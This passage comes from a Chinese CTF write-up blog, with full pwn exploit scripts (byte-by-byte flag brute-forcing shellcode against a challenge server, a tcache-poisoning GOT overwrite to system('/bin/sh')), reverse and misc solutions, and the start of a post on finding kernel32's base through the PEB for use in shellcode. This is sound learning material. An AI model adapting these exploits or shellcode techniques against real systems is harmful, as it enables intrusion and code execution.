'critical'shellcode1_part1 = asm(''' pop rax pop rbx nop xor edx, ebx pop rbx xor ax, 0x03e6 xor ax, 0x100 sub al, 1 nop push rbx push rax push rbx push rax''')shellcode1_part2 = asm(''' push rbx enter 0x1, 0x3 nop pop rbx push rax push rbx nop pop rbx ret 0x0009 pop rbx''')shellcode1 = shellcode1_part1 + shellcode1_part2lenth = len(shellcode1)padding_times = int((0x200 - lenth) / 2)padding = b'\\x90\\x61' * padding_timesshellcode1 = shellcode1 + paddingfor i, c in enumerate(shellcode1): # if c &gt;= 0b10000000: # log.info(\"bad byte %s at index %d\" % (hex(c), i)) # log.error(shellcode1) if i &amp; 1 != c &amp; 1: log.info(\"bad byte %s at index %d\" % (hex(c), i)) log.error(shellcode1) if c &amp; 1 == 1 and c &gt; 0x80: log.info(\"negative byte %s at index %d\" % (hex(c), i)) log.error(shellcode1)# we need brute force every byte of flag# the seach space is 0x20 ~ 0x7esearch_space = [i for i in range(0x20, 0x7e)]flag_probable_len = 0x40flag = ''for i in range(flag_probable_len): for ch in search_space: # p = process(binary.path) p = remote('111.186.57.85',40245) p.recvuntil(b'Please input your shellcode: \\n') ### stage1: call a read syscall to read shellcode p.send(shellcode1) ### stage2: fuck yeah! we can send shellcode without limitation now # but we have no write # so we have to use ways like side channel shellcode2 = asm(f''' lea rdi, [rip+flag] mov rsi, 0 mov rax, 2 syscall mov rdi, rax mov rsi, rsp mov rdx, 0x100 mov rax, 0 syscall loop: xor rax, rax xor rbx, rbx mov al, byte ptr[rsp+{i}] mov bl, {ch} cmp al, bl je loop flag: .string \"./flag\" ''') shellcode2 += b'\\x90' * (0x200 - len(shellcode2)) p.send(shellcode2) # learned from changcheng cup... p.shutdown('send') # now if ch is the right byte, the program will be in a dead loop # otherwise the program will die sleep(1) # if p.poll() == None: # flag += chr(ch) # print(\"flag is now: \", flag) # p.close() # break # else: # p.close() # continue try: detection = p.fileno() p.recv(timeout=0.1) flag += chr(ch) print(\"flag is now: \", flag) p.close() break except: p.close() continue if flag[:-1] == '}': breakprint(flag) flag: 10ops{practice_handwrite_shellcode} flat本题的考察点是deflat去混淆和tcache劫持。 其实题目对deflat的提示很明显，但是我一开始没往这方面向，直到出flag才知道要用deflat，一开始是自己手动去混淆的： 先看明白了每种操作对应一个opcode，然后找==，然后根据i=xxxxx去找casexxxxx，有if的就猜测可能是对什么进行判断（比如索引、size），然后选一个i去找case……最后硬是把程序的主要逻辑逆向出来了： 48879: 退出程序 4112：堆块写，但是最后一位由程序置零（edit_0_end） e.g. edit_0_end(index, payload) 会对index所对应位置的size和address做非空检查，且0&lt;=index&lt;31，payload的长度实际上最多比size少1，最后一字节会被置0 768: malloc e.g. malloc(index, size, payload) 会对index所对应位置的size和address做非空检查，且0&lt;=index&lt;31，payload的长度实际上最多比size少1，最后一字节会被置0 2989: 堆块写（edit） e.g. edit(index, payload) 会对index所对应位置的size和address做非空检查，且0&lt;=index&lt;31，payload的长度恰好等于size 4919: free e.g.free(index) 会检查0&lt;=inex&lt;31，检查address处是否已经为空，然后将对应address和size都置零。 57005: 堆块读（puts） 会对index所对应位置的size和address做非空检查，且0&lt;=index&lt;31，然后puts堆块内容 但是这里的0截断并没有off-by-null漏洞，在how2heap找了半天找不到利用方法。于是在gdb里先试着： 12345678910111213141516171819202122232425262728293031323334353637from pwn import *binary = context.binary = ELF('./flat')libc = binary.libcp = binary.process()def malloc(index, size, data): p.sendline(b'768') p.sendline(str(index).encode()) p.sendline(str(size).encode()) p.sendline(data)def free(index): p.sendline(b'4919') p.sendline(str(index).encode())def edit(index, data): p.sendline(b'2989') p.sendline(str(index).encode()) p.send(data)def edit_0_end(index, data): p.sendline(b'4112') p.sendline(str(index).encode()) p.sendline(data)def puts(index): p.sendline(b'57005') p.sendline(str(index).encode()) return p.recvline().strip()malloc(0,0x100, b'a')edit(0, cyclic(0x100))# gdb.attach(p)malloc(1,0x100, b'b')edit(1, cyclic(0x100)) 发现mallo个两次0x100大小的堆块程序就退出了，于是在第一次后面把gdb附上去： 十分离谱……我到现在也没弄明白这个漏洞是哪里来的。 换成0x80及以下似乎就没这种情况,0x90的时候链表有两个值，分别是我们输入的0x80处和0x88处，也就是说我们在0x80和0x88处写上合法的地址，下一次malloc相应大小的chunk就能控制我们输入的地址。 checksec一下： 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x3fe000)RUNPATH: b'.' 那么我们现在需要做的就很清晰： leak libc got hijacking get shell 首先，准备好用于leak和劫持的堆块，以及写有/bin/sh的堆块；然后malloc一个可用大小为0x90的堆块，malloc一个可用大小为0x330（实际大小为0x340）的堆块并free掉，使得tcache的0x340大小链表有一项。然后往0x90大小的堆块里面填满heap_manager地址（也就是该程序用来管理堆块的区域起始地址）。这样当我们再malloc一个可用大小为0x330到0x338大小的堆块时，就会返回heap_manager的地址。我们往这里面填入0x1000和free_got的地址，这样程序自定义的堆管理器就会认为index0处之前malloc了一个可用大小为0x1000的堆块，且位于free_got。因此我们这时再puts(0)就不会报错，也就能够leak出libc中free的地址，也就知道了libc的基地址。然后利用这个基地址知道system的地址，往0写入这个地址，也就将free劫持到system。最后我们free(1)，1是我们之前放/bin/sh的地方，此时执行system('/bin/sh')，得到shell。 完整exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *binary = context.binary = ELF('./flat')libc = binary.libc# p = binary.process()p = remote('111.186.57.85', 40246)def malloc(index, size, data): p.sendline(b'768') p.sendline(str(index).encode()) p.sendline(str(size).encode()) p.sendline(data)def free(index): p.sendline(b'4919') p.sendline(str(index).encode())def edit(index, data): p.sendline(b'2989') p.sendline(str(index).encode()) p.send(data)def edit_0_end(index, data): p.sendline(b'4112') p.sendline(str(index).encode()) p.sendline(data)def puts(index): p.sendline(b'57005') p.sendline(str(index).encode()) return p.recvline().strip()free_got = binary.got['free']heap_manager = 0x4060B0# we will use this to get libc leak and control free_gotmalloc(0,0x500, b'a')malloc(1,0x20,b'/bin/sh\\x00')free(0)# 2 is used to get control of tcachemalloc(2,0x90, b'b')# 3 is used to make a tcache binmalloc(3,0x330, b'c')free(3)gdb.attach(p)edit(2,p64(heap_manager)*(0x90//8))# now tcace bin is# 0x340 [ 1]: 0x4060b0 ◂— 0x0# 0x350 [ 0]: 0x4060b0 ◂— ...payload=p64(0x1000)+p32(free_got)# now we control the heap_manager# we make index 0 's size 0x1000# and we make index 1 's pointer to free_gotmalloc(3,0x330,payload)# this will puts what is on the free_gotresponse = puts(0)libc_leak = response[-6:].ljust(8, b'\\x00')libc.address = u64(libc_leak) - libc.sym['free']info(f'[LEAK&amp;CALC]: libc_base: {hex(libc.address)}')system = libc.sym['system']# we overwrite free_got with systemedit_0_end(0,p64(system))# 1's pointer point to /bin/shfree(1)p.interactive() flag: 10ops{learning_deflat_trick_to_defeat_ollvm} REVERSEPeer-Trace这道题的考察点是ptrace和strace的用法。 peer程序会调用puppet程序，并使用ptrace来在不同运行时刻监视peer程序并修改其内存/寄存器的值。 先从网上学习了下ptrace的用法，主要关注PTRACE_POKEDATA, PTRACE_SETREGS因为这两个会修改被监视子程序的内存/寄存器。 puppet程序的逻辑是读取一个输入，长度需要为48字节，然后逐字节与0x28异或，最后与ct区域的48字节做比较。 建议使用strace观察程序运行过程中ptrace相关内容： 1strace ./peer peer程序的主要逻辑可以通过观察PTRACE_POKEDATA, PTRACE_SETREGS和相应的ida伪代码得到： 对输入的48字节做下面的逻辑： 分为8组，对每组： 交换0，5 交换1，7 交换2，6 *((_BYTE *)v25 + j) -= j + i，其中j是组内索引，i是组号，v25是每组的起始地址 交换3，4 在异或0x28后，劫持程序，对每个字节做如下修改： 123456v25[0] = 0xA39C3E6994313F40LL;v25[1] = 0x17872470565B9B60LL;v25[2] = 0x11A918AABA97CA68LL;v25[3] = 0xB8F1B0AB9B3DD3B0LL;v25[4] = 0x488749FB6A1835E4LL;v25[5] = 0x82926F78FE98158LL; 每个字节分别与peer中此时的v25中对应字节相加，舍去进位。 最后再与puppet程序中ct区域的48字节作比较，需要相等。整个过程都是相对简单的可逆过程，将算法反过来即可。完整exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *v25 = p64(0xA39C3E6994313F40) + p64(0x17872470565B9B60) + p64(0x11A918AABA97CA68) + p64(0xB8F1B0AB9B3DD3B0) + p64(0x488749FB6A1835E4) + p64(0x82926F78FE98158)ct = p64(0xe3de41c1f389569c) + p64(0x3500a2b1a46c9bd1) + p64(0x890a29f3d010d481) + p64(0x200f1fca08a04513) + p64(0xc3ab5b0381564f00) + p64(0x08953b09bbf7fdc7)# tmp1 is the bytearray after xoredtmp1 = bytearray()# each byte in tmp is the result of ct[i] - v25[i]for i in range(48): if ct[i] &lt; v25[i]: tmp1.append(ct[i] + 256 - v25[i]) else: tmp1.append(ct[i] - v25[i])# tmp1 is the bytearray before xored with 0x28for i in range(48): tmp1[i] ^= 0x28print(tmp1)def reverse(cypher): # group cypher into 8 bytes cypher = [cypher[i:i+8] for i in range(0, len(cypher), 8)] # for each group, we decrypt it for i in range(len(cypher)): # swap BYTE3 and BYTE4 tmp = cypher[i][3] cypher[i][3] = cypher[i][4] cypher[i][4] = tmp for j in range(8): cypher[i][j] += j + i*8 # swap BYTE2 and BYTE6 tmp = cypher[i][2] cypher[i][2] = cypher[i][6] cypher[i][6] = tmp # swap BYTE1 and BYTE7 tmp = cypher[i][1] cypher[i][1] = cypher[i][7] cypher[i][7] = tmp # swap BYTE0 and BYTE5 tmp = cypher[i][0] cypher[i][0] = cypher[i][5] cypher[i][5] = tmp # get the result result = b'' for i in range(len(cypher)): result += bytes(cypher[i]) print(result)reverse(tmp1) flag: 10ops{tr@cE_traC1Ng_tRAc3d_TRaces_z2CcT8SjWre0oP} MISCQrCode2本题考查的是二维码的结构和标准qrazybox的使用。 之前在做hackergame还是geekgame的时候碰到一道华维码，是华容道和二维码还原的结合。题目没做出来，但是在群里看到个二维码仙人，整天在群里发他还原二维码的过程。这下真用上了，快说谢谢二维码仙人。 贴一个二维码仙人的二维码教程 要用到的工具是qrazybox 由于定位块缺失，我先直接根据图片把已知的黑色白色都填充上，然后一个一个试纠错等级，发现只有M0是符合的，然后用qrazybox的tools把padding bits补上： 但是缺失的内容实在太多了，无论是直接提取还是用Reed-Solomon Decoder都得不到flag，但是通过Data Sequence Analysis可以看到message data有一个}，而题目已经告诉我们这题的flag格式为flag{.*}，根据二维码格式，我们将前5位message data修改位flag{，这时候再用Reed-Solomon Decoder已经可以得到flag了。 修改数据后的结果： flag: 1flag{D4+4_2e(0\\/3R_v_!5_S0_3a5_v} WhereIsMyFlag本题考察的是视力和对数据的处理能力。 在github的commit记录最后可以看到： 1import gzip; import base64; gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA==')) 运行这段代码发现处理后的数据还是1f8b开头，推断仍然是gzip。直接写到文件里去： 123456import gzipimport base64x = gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='))with open(\"out.gz\", \"wb+\") as f: f.write(x) 然后再终端反复解压缩，得到二进制文件后strings一下： 1234gzip -d out.gzmv out out.gzgzip -d out.gzstrings ./out 就可以得到flag: 1flag{760671da3ca23cae060262190c01e575873c72e6} RealOrNot本题考查的是写脚本的能力，大概。 pow challenge 应该是区块链中的概念？但是和这道题关系不大，这题的pow challenge直接让AI就能写，要花太长时间的challenge就跳过好了。 给的server.py并不会输出第几张图片判断错了，但是实际交互时显示了。而且在我把所有图片都无重复地保存下来后发现总共只有100张图片，服务器会每次选20张让我们判断真伪，因此我们可以先将所有图片都随便打上标签，然后根据标签去向服务器发送答案，服务器每次都会给我们纠错一张，我们根据错误信息修改对应图片的标签，很快就能将所有图片的标签都修改正确。这时无论服务器选哪20张我们都能给出正确的答案。 保存图片的脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import hashlibimport base64import osimport uuidfrom pwn import *def verify_pow_solution(challenge, solution): prefix = \"0000\" guess = solution + challenge guess_hash = hashlib.sha256(guess.encode()).hexdigest() return guess_hash.startswith(prefix)def solve_pow(challenge, difficulty=4, timeout=0.5): start_time = time.time() while True: for solution in (f\"{i:0{difficulty}x}\" for i in range(16 ** difficulty)): if verify_pow_solution(challenge, solution): return solution if time.time() - start_time &gt;= timeout: return None def save_image(): count = 0 for i in range(20): p.recvuntil(b'Is this picture real or not (Y/N)? \\n') b64_image = p.recvuntil(b'\\n', drop=True) # compared with the local images using b64, if the image is not in the local images, save it # using a uuid as the filename # if folder is empty, save the image directly if not os.listdir('images'): with open(f'images/{uuid.uuid4()}.png', 'wb') as f: f.write(base64.b64decode(b64_image)) count += 1 else: save_flag = True for filename in os.listdir('images'): with open(f'images/{filename}', 'rb') as f: if base64.b64encode(f.read()).decode() == b64_image.decode(): save_flag = False break if save_flag: with open(f'images/{uuid.uuid4()}.png', 'wb') as f: f.write(base64.b64decode(b64_image)) count += 1 info(f\"save {count} images\")p = remote('instance.penguin.0ops.sjtu.cn', 18081)p.send(b'CONNECT w44bxg7cgh48frjc:1 HTTP/1.1\\r\\n\\r\\n')p.recvuntil(b\"solution + '\")challenge = p.recvuntil(b\"'\", drop=True).decode()info(f\"challenge: {challenge}\")# p.interactive()solution = solve_pow(challenge)info(f\"solution: {solution}\")p.sendline(solution.encode())save_image()p.close() 这道题的标签我一开始是用模型打的，但是准确率并不高。exp如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import hashlibimport base64import osimport timefrom pwn import *context.log_level = 'info'def verify_pow_solution(challenge, solution): prefix = \"0000\" guess = solution + challenge guess_hash = hashlib.sha256(guess.encode()).hexdigest() return guess_hash.startswith(prefix)def solve_pow(challenge, difficulty=4, timeout=0.5): start_time = time.time() while True: for solution in (f\"{i:0{difficulty}x}\" for i in range(16 ** difficulty)): if verify_pow_solution(challenge, solution): return solution if time.time() - start_time &gt;= timeout: return None def eval_image(): for _ in range(20): p.recvuntil(b'Is this picture real or not (Y/N)? \\n') b64_image = p.recvuntil(b'\\n', drop=True) for filename in os.listdir('images_model'): with open(f'images_model/{filename}', 'rb') as f: if base64.b64encode(f.read()).decode() == b64_image.decode(): correct_answer = filename[-5].upper() file_list.append(filename) if correct_answer != 'Y' and correct_answer != 'N': correct_answer = 'N' correct_answers.append(correct_answer) break p.recvuntil(b\" all 20 rounds (Y/N): \") data = ''.join(correct_answers) info(data) p.sendline(data.encode())while True: correct_answers = [] file_list = [] p = remote('instance.penguin.0ops.sjtu.cn', 18081) p.send(b'CONNECT gmvfevkv2k6p982q:1 HTTP/1.1\\r\\n\\r\\n') p.recvuntil(b\"solution + '\") challenge = p.recvuntil(b\"'\", drop=True).decode() info(f\"challenge: {challenge}\") # p.interactive() solution = solve_pow(challenge) if solution is None: p.close() continue info(f\"solution: {solution}\") p.sendline(solution.encode()) eval_image() try: response = p.recvuntil(b\"Incorrect answer for Round \", timeout=0.3) wrong_round = p.recvuntil(b\".\", drop=True) info(f\"wrong_round: {wrong_round}\") wrong_round = int(wrong_round) wrong_filename = file_list[wrong_round - 1] # change the filename to the right answer(opposite of original answer) # modify the filename to the right answer correct_answer = correct_answers[wrong_round - 1] if correct_answer == 'Y': correct_answer = 'N' else: correct_answer = 'Y' right_filename = wrong_filename[:-5] + correct_answer + '.png' # append the wrong filename to log.txt with open('log.txt', 'a') as f: f.write(f'{wrong_filename}\\n') os.rename(f'images_model/{wrong_filename}', f'images_model/{right_filename}') p.close() continue except: breakp.interactive() flag: 1flag{DeepFake_1s_Ea5y_aNd_1ntere5t1ng!} RealOrNotRevenge本题考察的是谷歌识图的能力。 下载图片和之前一样，这道题我下载下来只有86张图片。我全部拿去谷歌识图，能搜到的大多数是unsplash上的图片。能搜到的我都标记Y，搜不到的都标记N。准确率似乎极高。。。跑个几次就出flag了。因此主要工作量在于我手动谷歌识图，但是应该可以写代码调用API？ exp如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import hashlibimport base64import osimport timefrom pwn import *context.log_level = 'info'def verify_pow_solution(challenge, solution): prefix = \"00000\" guess = solution + challenge guess_hash = hashlib.sha256(guess.encode()).hexdigest() return guess_hash.startswith(prefix)def solve_pow(challenge, difficulty=5, timeout=3): start_time = time.time() while True: for solution in (f\"{i:0{difficulty}x}\" for i in range(16 ** difficulty)): if verify_pow_solution(challenge, solution): return solution if time.time() - start_time &gt;= timeout: return None def eval_image(): for _ in range(20): p.recvuntil(b'Is this picture real or not (Y/N)? \\n') b64_image = p.recvuntil(b'\\n', drop=True) for filename in os.listdir('images_model'): with open(f'images_model/{filename}', 'rb') as f: if base64.b64encode(f.read()).decode() == b64_image.decode(): correct_answer = filename[-5].upper() file_list.append(filename) if correct_answer != 'Y' and correct_answer != 'N': correct_answer = 'N' correct_answers.append(correct_answer) break p.recvuntil(b\" all 20 rounds (Y/N): \") data = ''.join(correct_answers) info(data) p.sendline(data.encode())while True: correct_answers = [] file_list = [] p = remote('instance.penguin.0ops.sjtu.cn', 18081) p.send(b'CONNECT 6gmer7hwgjkkh6fc:1 HTTP/1.1\\r\\n\\r\\n') p.recvuntil(b\"solution + '\") challenge = p.recvuntil(b\"'\", drop=True).decode() info(f\"challenge: {challenge}\") # p.interactive() solution = solve_pow(challenge) if solution is None: p.close() continue info(f\"solution: {solution}\") p.sendline(solution.encode()) eval_image() print(len(file_list)) response = p.recvline() if b'flag' in response: print(response) break p.close() flag: 1flag{Revenge_1s_Ea5y_aNd_1ntere5t1ng!} f and r本题考察的是信息检索能力和动手能力。 几乎全靠这篇文章： https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html 根据文章提到的步骤把msu里面的cab提取出来： 1234567891011mkdir contentexpand.exe -F:* \".\\windows10.0-kb114514-x64.msu\" ./contentcd contentmkdir contentexpand.exe -F:* \".\\Windows10.0-KB114514-x64.cab\" ./contentcd contentmkdir contentexpand.exe -F:* \".\\Windows10.0-KB114514-x64.cab\" ./contentcd contentmkdir contentexpand.exe -F:* \".\\Cab_for_KB114514_PSFX.cab\" ./content 发现f和r文件夹下都有curl.exe。那么我们要做的就是从delta和curl.exe恢复出一个二进制文件。 需要利用作者编写的delta_patch.py。但是直接将题目给的f和r喂进去是行不通的。 文中有这么一段： To generate the binaries I want I’m going to apply the reverse delta and then each forward delta, creating two output files: 123456PS &gt; python X:\\Patches\\tools\\delta_patch.py -i ntoskrnl.exe -o ntoskrnl.2020-07.exe .\\r\\ntoskrnl.exe X:\\Patches\\x64\\1903\\2020\\2020-07\\x64\\os-kernel_10.0.18362.959\\f\\ntoskrnl.exeApplied 2 patches successfullyFinal hash: zZC/JZ+y5ZLrqTvhRVNf1/79C4ZYwXgmZ+DZBMoq8ek=PS &gt; python X:\\Patches\\tools\\delta_patch.py -i ntoskrnl.exe -o ntoskrnl.2020-08.exe .\\r\\ntoskrnl.exe X:\\Patches\\x64\\1903\\2020\\2020-08\\x64\\os-kernel_10.0.18362.1016\\f\\ntoskrnl.exeApplied 2 patches successfullyFinal hash: UZw7bE231NL2R0S4yBNT1nmDW8PQ83u9rjp91AiCrUQ= 何意呢，目测是说： 我们有一个比较新的文件，一个旧补丁，一个处于中间的补丁。利用旧补丁的r回到旧版本，再用中间补丁的f就可以生成中间版本。 update.mum里面有一串网址：https://support.macrohard.com/help/5034203 好好好把巨硬改成微软，发现是KB5034203更新，那就把这个msu下载下来，提取出其中curl的f和r。 然后用KB5034203的r回滚到旧版本，用题目给的f生成我们要的二进制文件。 12python delta_patch.py -i curl.exe -o curl.patched.exe .\\kb5034203\\r\\curl.exe .\\kb114514\\amd64_curl_0o0o0o0o0o0o0o0_10.0.19041.9999_none_0o0o0o0o0o0o0o0\\f\\curl.exe.\\curl.patched.exe --version 得到flag: 1flag{ dc1d03c554150a cedca6d71ce394 } 去掉空格即可。 Boy’s Bullet本题考查图片exif编辑能力和阅读理解能力。 回旋镖是吧。2000年出生的男孩24岁开枪38岁噶了，我作为一个2024年出生的照片也应该38岁时噶，所以应该是2062年。刚开始这个时间戳没搞明白啥意思，一开始文件名里带时间错，后来在图片里加时间戳，后来才猛地想起exif也有时间戳。 用这个网站随便修改了一张图片的exif信息（Modify Date），然后上传： 1curl -T 2062.jpeg http://111.186.57.85:10038 就能得到flag: 1flag{47_7h15_m0m3n7_3duc4710n_h45_c0mp1373d_4_72u1y_c1053d_100p} 没记flag，学校那个莫名连不上，换geekctf复现的。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.beacox.space/categories/CTF/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://blog.beacox.space/tags/PWN/"},{"name":"Web","slug":"Web","permalink":"https://blog.beacox.space/tags/Web/"},{"name":"Misc","slug":"Misc","permalink":"https://blog.beacox.space/tags/Misc/"},{"name":"Reverse","slug":"Reverse","permalink":"https://blog.beacox.space/tags/Reverse/"}]},{"title":"Windows PEB 利用","slug":"windows-peb-walkthrough","date":"2024-03-16T12:00:00.000Z","updated":"2024-03-16T12:00:00.000Z","comments":true,"path":"posts/windows-peb-walkthrough/","link":"","permalink":"https://blog.beacox.space/posts/windows-peb-walkthrough/","excerpt":"","text":"ASLRASLR，全称 Address space layout randomization，即地址空间配置随机加载。多数现代的应用程序都会开启 ASLR。目的是防止攻击者事先获知程序的虚拟内存地址，防止攻击者能可靠地跳转到内存的特定位置来利用函数。 在Linux中，ASLR 的实现方式是同一个应用程序每次启动都会被加载到不同的位置。而在 Windows 中，只能保证系统重启后地址的随机性。 究其原因，是对性能和安全性权衡后的结果。由于 Windows 不采用 PIE，因此其 ASLR 的实现需要付出内存代价。 每次将库映射到不同地址时，都会占用更多内存。 当然这也意味着，如果我们在某台 Windows 机器上获取了一次库函数的虚拟地址，在其重启之前，我们都能够继续使用。 PEB在 Linux 中，内核通过task_struct保存并管理进程相关的信息，在 Windows 中起到类似作用的是PEB。当然，还是有许多不同之处。例如 PEB 在用户态中而 task_struct在内核态中。 进程环境块（PEB）是 Windows NT操作系统内部使用的数据结构，用以存储每个进程的运行时数据。 维基百科对 PEB 的描述足够全面，推荐感兴趣的读者继续阅读，值得注意的是中文翻译有些瑕疵。说回到 PEB，PEB 是一个结构体，包含了进程是否被调试、被加载模块的虚拟地址等大量信息。 在 Windows 11 23H2 (2023 Update) 版本的内核中，PEB 的部分定义如下： 123456789101112131415161718192021222324252627282930313233//0x7d0 bytes (sizeof)struct _PEB{ UCHAR InheritedAddressSpace; //0x0 UCHAR ReadImageFileExecOptions; //0x1 UCHAR BeingDebugged; //0x2 union { UCHAR BitField; //0x3 struct { UCHAR ImageUsesLargePages:1; //0x3 UCHAR IsProtectedProcess:1; //0x3 UCHAR IsImageDynamicallyRelocated:1; //0x3 UCHAR SkipPatchingUser32Forwarders:1; //0x3 UCHAR IsPackagedProcess:1; //0x3 UCHAR IsAppContainer:1; //0x3 UCHAR IsProtectedProcessLight:1; //0x3 UCHAR IsLongPathAwareProcess:1; //0x3 }; }; UCHAR Padding0[4]; //0x4 VOID* Mutant; //0x8 VOID* ImageBaseAddress; //0x10 struct _PEB_LDR_DATA* Ldr; //0x18 struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters; //0x20 VOID* SubSystemData; //0x28 VOID* ProcessHeap; //0x30 struct _RTL_CRITICAL_SECTION* FastPebLock; //0x38 union _SLIST_HEADER* volatile AtlThunkSListPtr; //0x40 VOID* IFEOKey; //0x48 ……}; 在本文中，我们主要关注偏移为 0x18 的 Ldr 字段。为什么？因为它包含了被加载模块（用到的库）的虚拟地址。 Ldr 概览在利用之前，或许应该先看看这个字段包含什么内容。我先在 Windbg 中随机打开一个应用程序看看 PEB 及 Ldr 的内容。 在命令框中键入lm，即 list modules，可以看到这个应用加载了5个模块。其中a是程序本身的名字（a.exe），而KERNEL32是我们关心的另一个模块，因为它控制着系统的内存管理、数据的输入输出操作和中断处理，或者换句话说，其中有许多我们可以利用的函数（如WriteFile()用来写）。在不使用调试工具的时候我们无法如此便捷地获取被加载模块的地址，因此我们需要用到 PEB。 在 Windbg 中也可以很方便地查看 PEB 信息： 在命令框中键入!peb可以看到 Ldr.InMemoryOrderModuleList下存储着被加载模块地基地址，其中第一个和第三个是我们的目标，其显示的基地址和之前使用lm命令查看到的地址是一致的。 值得一提的是，这些 Modules 正是以 List 链表形式存储的。我们简单地验证一下： 不难发现，在每个条目的开头存储着下一个条目的地址，而偏移 0x20 处存储着被加载模块的基地址。因此当我们表头的地址时，我们可以通过每个链表项跳转到下一个链表项、可以获取每个链表项下模块的基地址。 PoC接下来就是编写 C 代码获取被加载模块虚拟地址的 demo 了。我们先提出尚未解决的几个问题： 如何获得 PEB 结构体在内存中的地址？ Ldr 相对 PEB 的偏移量已知是 0x18，Ldr.InMemoryOrderModuleList 相对 Ldr 的偏移是多少？ 先回答第二个问题：Ldr.InMemoryOrderModuleList 相对 Ldr 的偏移是 0x20 。并且在我们编写 C 代码的时候，不需要知道具体的偏移量，只需要知道字段名称即可，相应的库会帮我们处理好偏移量。 接着是第一个问题：Windows 用 FS/GS 寄存器来存储 PEB 的地址，分别对应32位/64位。具体如下： 32位：fs:0x30 64位：gs:0x60 :后代表偏移量。 解决了这两个问题之后就可以编写 C 代码了： 12345678910111213141516171819202122232425262728#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;windows.h&gt;#include &lt;winnt.h&gt;#include &lt;winternl.h&gt;int main(void) { // __readgsqword(0x60) equals to mov &lt;register&gt;, gs:[0x60] PPEB pebPtr = (PPEB)__readgsqword(0x60); PPEB_LDR_DATA ldrData = pebPtr-&gt;Ldr; PLIST_ENTRY moduleList = &amp;ldrData-&gt;InMemoryOrderModuleList; // Get the first module in the list PLDR_DATA_TABLE_ENTRY program_module = CONTAINING_RECORD(moduleList-&gt;Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); // Skip 3 modules to get kernel32.dll moduleList = moduleList-&gt;Flink; moduleList = moduleList-&gt;Flink; moduleList = moduleList-&gt;Flink; // Get kernel32.dll PLDR_DATA_TABLE_ENTRY kernel32_module = CONTAINING_RECORD(moduleList, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID program_base = program_module-&gt;DllBase; PVOID kernel32_base = kernel32_module-&gt;DllBase; printf(\"Program base: %p\\n\", program_base); printf(\"Kernel32 base: %p\\n\", kernel32_base); return 0;} 简单地解释一下流程： 通过 gs 寄存器获取 PEB 地址 通过 PEB 结构体获取 Ldr 通过 Ldr 获取 InMemoryOrderModuleList Flink 一次将取出表头，在固定的偏移处可以取出程序基地址 Flink 3次将取出第三项，在同样的偏移处可以取出 Kernel32.dll 的基地址 编译成可执行文件并运行： 12gcc poc.c./a.exe 得到输出： 12Program base: 0000000000400000Kernel32 base: 00007FFEBE4B0000 发现与在 Windbg 中得到的一致。 这证明：我们可以通过编写 C 代码获得被加载模块的基地址。更进一步地，我们的 C 代码经过编译后反汇编得到的汇编代码简单清晰，这意味着我们可以编写比较简单的汇编来实现这一目标。换言之，我们可以在 shellcode 中实现这一目标从而绕过 